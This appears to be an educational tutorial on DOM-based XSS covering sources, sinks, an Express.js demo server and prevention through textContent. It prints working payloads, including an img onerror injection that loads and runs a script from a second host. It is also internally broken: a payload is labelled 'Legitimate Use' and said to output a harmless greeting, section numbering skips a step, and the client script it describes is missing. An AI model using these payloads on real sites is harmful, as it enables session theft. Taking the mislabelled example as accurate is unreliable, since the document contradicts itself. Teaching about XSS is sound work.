🛡️ Understanding DOM-Based XSS

DOM-Based XSS is a type of XSS attack where the vulnerability exists entirely on the client side. The malicious payload is executed when the client's script writes user-controllable data to the Document Object Model (DOM) in an unsafe way.

Key Concepts

  • DOM (Document Object Model): This is a programming interface for web documents. It represents the page so that programs (like JavaScript) can change the document structure, style, and content.
  • Source: The location where user-supplied data is read (e.g., document.location.hash, document.location.search, document.cookie).
  • Sink: The dangerous function or property that can cause the execution of malicious code if it writes unsanitized data to the DOM (e.g., element.innerHTML, document.write(), element.outerHTML).

How It Works

  • Input: An attacker crafts a malicious URL that includes the payload, typically in the fragment (#) or query string (?) portion. 
    // Example URL:
https://vulnerable-app.com/page.html#name=<script>alert('XSS')</script>
  • Unsafe Script: The victim clicks this link. The legitimate client-side JavaScript on page.html reads the data from the URL (the source) and then uses a vulnerable function (the sink) to insert that data into the HTML page without properly sanitizing it.
  • Execution: The browser sees the inserted data, which includes the <script> tag. Because the browser trusts its own page, it executes the inserted script.
  • Consequence: The attacker's script executes in the context of the victim's session, allowing them to perform actions like stealing session cookies, performing actions on the user's behalf, or redirecting the user.

🎯 DOM-Based XSS: A Simple Analogy

Imagine a fast-food restaurant with a digital "Welcome" board.

  • Normal Process: A manager types "Welcome, John!" into the system. The board displays the text safely.
  • Vulnerability: The system for updating the board is sloppy. Instead of just displaying the text, it allows the manager to input raw HTML code.
  • The Attack: An attacker sends the restaurant a message that says, "Welcome, John! Please insert a hidden ad here: <script>stealCreditCards()</script>"
  • Result: The sloppy system takes that entire string and tries to execute the <script> as part of the board's display logic.

💻 Practical (Conceptual) Example

While the attack is client-side, a server (like Express.js) is required to serve the vulnerable HTML and JavaScript.

1. Express.js Server Setup

An Express.js server simply serves the vulnerable HTML file.

import express from "express";

const app = express();
const port = 3000;

app.use((req, res, next) => {
  console.log(req.url);
  next();
});

app.use(express.static("./public"));

app.listen(port, () => {
  console.log(`DOM XSS demo running at http://localhost:${port}`);
});

3. The Attack Vector

  • Legitimate Use (Output Example): If a user visits http://localhost:3000/#arman%20%3Cimg%20src%20onerror='const%20s%20=%20document.createElement(%22script%22);%20s.src%20=%20%22http://localhost:8000/script.js%22;%20document.body.appendChild(s)'%20/%3E, the user-greeting span becomes: <span id="user-greeting">Alice</span> (Output: Welcome, Alice!)
  • Attacker's Payload: The attacker sends the victim a URL like this: 
    http://localhost:3000/#<img src=x onerror=alert('XSS')>
  • What Happens:
    • The client-side script reads nameParam as <img src=x onerror=alert('XSS')>.
    • It executes: document.getElementById('user-greeting').innerHTML = "<img src=x onerror=alert('XSS')>".
    • The **DOM is updated**, creating an <img> tag.
    • The browser attempts to load the image (src=x), which fails, triggering the onerror event.
    • The malicious JavaScript code, alert('XSS'), executes in the victim's browser.

✅ Prevention

The key to preventing DOM-Based XSS is to **never write unsanitized, user-controllable data to a dangerous sink**.

  • Avoid Dangerous Sinks: Whenever possible, avoid sinks like innerHTML, document.write(), and outerHTML for user-supplied data.
  • Use Safe Properties: If you only need to update text content, use .textContent or .innerText instead of .innerHTML. These properties automatically treat the input as raw text, preventing the browser from parsing it as HTML.
